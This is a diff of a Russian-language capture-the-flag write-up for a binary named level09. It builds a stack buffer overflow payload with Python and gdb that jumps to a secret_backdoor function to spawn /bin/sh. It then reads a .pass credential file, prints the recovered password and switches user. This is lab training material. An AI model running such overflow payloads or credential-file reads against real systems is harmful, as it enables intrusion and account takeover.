@@ -1,3 +1,6 @@
+
+Изучаем псевдокод:
+
 r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"A"*255')
 40 букв B, чтобы заполнить логин
 xff - (значение 255) следующая итерация цикла.
@@ -31,5 +34,19 @@ len
 что сохранение EIP находится в буфере + (192 + 8).
 
 Вписываем также адрес от функции backdoor и комануд, которую нужно запустить через /bin/sh.
+Ищем адрес secret_backdoor:
 
+Закидываем мусор 
+python -c "print 'A' * 40 + '\xff' + '\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'" > /tmp/pl
+gdb ./level09
+r < /tmp/pl
+x secret_backdoor
+0x55555555488c <secret_backdoor>
+
+Узнав адрес, запускаем наш скрипт с мусором и запуском функции backdoor с аргументами баш.
 (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat) | ./level09
+
+cat /home/users/end/.pass         
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+su end
